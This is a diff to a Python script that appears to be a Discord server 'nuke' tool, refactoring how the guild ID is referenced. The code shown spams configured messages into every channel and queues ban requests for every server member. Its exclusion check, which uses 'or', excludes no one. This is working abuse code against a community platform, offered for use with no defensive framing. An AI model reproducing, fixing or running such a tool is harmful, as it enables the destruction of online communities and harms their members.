@@ -9,7 +9,6 @@ console = Console()
 q = GetQ()
 headers = global_vars.headers
 config = global_vars.config
-guild_id = global_vars.guild_id
 
 def GetGuildMembers(guild_id) -> None:
 	r = requests.get(f"https://discord.com/api/v8/guilds/{guild_id}/members", headers = headers)
@@ -46,7 +45,7 @@ def SendMessage() -> None:
 			}
 		]
 	}
-	channels = GetChannels(guild_id)
+	channels = GetChannels(global_vars.guild_id)
 	amount_message = int(config['nuke']['amount_message_per_channel'])
 	for i in range(amount_message):
 		for channel in channels:
@@ -58,12 +57,12 @@ def SendMessage() -> None:
 
 def BanAll() -> None:
 	payload = {'delete_message_days':'0', 'reason': config['nuke']['ban_reason']}
-	members = GetGuildMembers(guild_id=guild_id)
+	members = GetGuildMembers(guild_id=global_vars.guild_id)
 	bot_id = GetBotId()
 	for member in members:
 		if member['id'] != config['discord']['user_id'] or member['id'] != str(bot_id):
 			try:
-				q.put((requests.put, f'https://discord.com/api/v8/guilds/{guild_id}/bans/{member["id"]}', headers, payload))
+				q.put((requests.put, f'https://discord.com/api/v8/guilds/{global_vars.guild_id}/bans/{member["id"]}', headers, payload))
 				console.log(f'Baned → {member["name"]}')
 			except:
 				console.error(f'Unble to ban → {member["name"]}')
